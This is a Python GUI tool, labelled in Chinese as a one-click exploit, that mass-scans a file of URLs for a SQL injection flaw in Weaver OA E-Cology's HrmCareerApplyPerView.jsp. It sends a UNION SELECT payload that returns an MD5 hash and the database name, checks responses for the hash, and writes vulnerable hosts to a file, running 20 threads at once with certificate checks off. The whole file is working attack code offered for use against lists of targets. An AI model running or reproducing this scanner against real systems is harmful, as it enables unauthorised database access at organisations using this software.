import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def Weaver_HrmCareerApplyPerView_sql_exp(url):
    poc = r"""/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "0x900150983cd24fb0d6963f7d28e17f72" in res.text:
            Weaver_HrmCareerApplyPerView_sql_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            Weaver_HrmCareerApplyPerView_sql_text.see(END)
            with open ("存在泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Weaver_HrmCareerApplyPerView_sql_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            Weaver_HrmCareerApplyPerView_sql_text.see(END)
    except Exception as err:
        Weaver_HrmCareerApplyPerView_sql_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Weaver_HrmCareerApplyPerView_sql_text.see(END)
def get_Weaver_HrmCareerApplyPerView_sql_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Weaver_HrmCareerApplyPerView_sql_gui():
    Weaver_HrmCareerApplyPerView_sql = tk.Tk()
    Weaver_HrmCareerApplyPerView_sql.geometry("910x450")
    Weaver_HrmCareerApplyPerView_sql.title("泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞一把梭")
    Weaver_HrmCareerApplyPerView_sql.resizable(0, 0)
    Weaver_HrmCareerApplyPerView_sql.iconbitmap('logo.ico')
    global Weaver_HrmCareerApplyPerView_sql_text
    Weaver_HrmCareerApplyPerView_sql_text = scrolledtext.ScrolledText(Weaver_HrmCareerApplyPerView_sql,width=123, height=25)
    Weaver_HrmCareerApplyPerView_sql_text.grid(row=0, column=0, padx=10, pady=10)
    Weaver_HrmCareerApplyPerView_sql_text.see(END)
    addrs = get_Weaver_HrmCareerApplyPerView_sql_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Weaver_HrmCareerApplyPerView_sql_exp, addr)
    Weaver_HrmCareerApplyPerView_sql.mainloop()